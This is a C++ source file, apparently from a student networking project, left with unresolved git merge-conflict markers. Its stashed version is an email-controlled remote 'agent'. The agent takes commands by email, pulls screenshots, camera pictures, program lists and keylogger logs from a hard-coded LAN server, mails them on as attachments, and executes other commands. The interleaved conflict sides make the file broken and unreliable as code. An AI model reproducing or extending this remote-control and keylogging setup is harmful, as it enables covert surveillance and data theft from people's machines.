<<<<<<< Updated upstream
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

using namespace std;

int main() {
  WSADATA wsa;
  WSAStartup(MAKEWORD(2, 2), &wsa);

  int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
=======
#include "../Application/lib.h"
#include "../Application/checkCommand.h"
#include <filesystem>
#include <iostream>
#include <sstream>
#include <thread>
#include <chrono>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <atomic>
#include <map>

#pragma comment(lib, "ws2_32.lib")

const std::string saveDir = "C:/MMT/";

static std::atomic<bool> running(true);

void signal_handler(int) { running.store(false); }

// Kết nối tới server (không gọi WSAStartup ở đây)
SOCKET connect_to_server(const std::string &host, int port) {
  SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock == INVALID_SOCKET) {
    std::cerr << "[Client] Socket creation failed: " << WSAGetLastError()
              << "\n";
    return INVALID_SOCKET;
  }
>>>>>>> Stashed changes

  sockaddr_in serverAddr{};
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_port = htons(8888);
  inet_pton(AF_INET, "127.0.0.1",
            &serverAddr.sin_addr);

<<<<<<< Updated upstream
  connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
  cout << "Connected to server\n";
=======
  if (connect(sock, (sockaddr *)&serverAddr, sizeof(serverAddr)) ==
      SOCKET_ERROR) {
    std::cerr << "[Client] Connection failed: " << WSAGetLastError() << "\n";
    closesocket(sock);
    return INVALID_SOCKET;
  }
>>>>>>> Stashed changes

  while (true) {
    string command;
    cout << "Enter command (or 'exit'): ";
    getline(cin, command);

<<<<<<< Updated upstream
    if (command == "exit") break;

    send(clientSocket, command.c_str(), command.length(), 0);

    char buffer[1024] = {};
    int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
    if (bytesReceived > 0) {
      cout << "[Server's respond] " << buffer << endl;
=======
// Thử kết nối với retry
SOCKET connect_with_retry(const std::string &host, int port, int attempts = 3,
                          int delay_ms = 500) {
  for (int i = 0; i < attempts; ++i) {
    SOCKET sock = connect_to_server(host, port);
    if (sock != INVALID_SOCKET) return sock;
    std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
  }
  return INVALID_SOCKET;
}

// Nhận file và lưu vào saveDir + filename
void receive_file(SOCKET sock, const std::string &filename) {
  std::filesystem::create_directories(saveDir);

  size_t fileSize = 0;
  int ret =
      recv(sock, reinterpret_cast<char *>(&fileSize), sizeof(fileSize), 0);
  if (ret <= 0) {
    std::cerr << "[Client] Failed to read file size or connection closed.\n";
    return;
  }

  if (fileSize == 0) {
    std::cerr << "[Client] No file received (size=0).\n";
    return;
  }

  std::string fullpath = saveDir + filename;
  std::ofstream file(fullpath, std::ios::binary);
  if (!file) {
    std::cerr << "[Client] Cannot open output file: " << fullpath << "\n";
    // drain
    char tmp[4096];
    size_t drained = 0;
    while (drained < fileSize) {
      int chunk = recv(sock, tmp, sizeof(tmp), 0);
      if (chunk <= 0) break;
      drained += chunk;
    }
    return;
  }

  char buffer[4096];
  size_t bytesReceived = 0;
  while (bytesReceived < fileSize) {
    int chunk = recv(sock, buffer, sizeof(buffer), 0);
    if (chunk <= 0) break;
    file.write(buffer, chunk);
    bytesReceived += chunk;
  }
  file.close();
  std::cout << "[Client] File received: " << fullpath << " (" << bytesReceived
            << " bytes)\n";
}

// map command -> (email subject, local filename)
std::map<std::string, std::pair<std::string, std::string>> fileCommands = {
    {"get_screenshot", {"Screenshot from server", "screenshot.png"}},
    {"get_picture", {"Picture from server", "picture.png"}},
    {"list_program", {"Program list from server", "programs.txt"}},
    {"keylogger", {"Keylogger log from server", "keylog.txt"}}};

void process_command(const std::string &command,
                     const std::string &senderEmail) {
  SOCKET sock = connect_with_retry("192.168.221.48", 8888);
  if (sock == INVALID_SOCKET) {
    std::cerr << "[Client] Could not connect to server after retries\n";
    return;
  }

  std::string payload = senderEmail + "\n" + command + "\n";
  send(sock, payload.c_str(), static_cast<int>(payload.size()), 0);

  if (fileCommands.count(command)) {
    auto [subject, localFile] = fileCommands[command];
    receive_file(sock, localFile);
    std::string fullpath = saveDir + localFile;
    send_email_with_attachment(senderEmail, subject,
                               "Requested file from server", fullpath);
  } else {
    execute_command(command);
  }

  closesocket(sock);
}

int main() {
  std::signal(SIGINT, signal_handler);
  std::signal(SIGTERM, signal_handler);

  WSADATA wsa;
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
    std::cerr << "[Client] WSAStartup failed\n";
    return 1;
  }

  curl_global_init(CURL_GLOBAL_DEFAULT);
  std::cout << "[Client] Agent started.\n";

  while (running.load()) {
    auto commands =
        fetch_email_commands();  // phải trả về vector<pair<cmd,sender>>
    for (auto &[cmd, senderEmail] : commands) {
      process_command(cmd, senderEmail);
>>>>>>> Stashed changes
    }
  }

<<<<<<< Updated upstream
  closesocket(clientSocket);
=======
  curl_global_cleanup();
>>>>>>> Stashed changes
  WSACleanup();
  return 0;
}
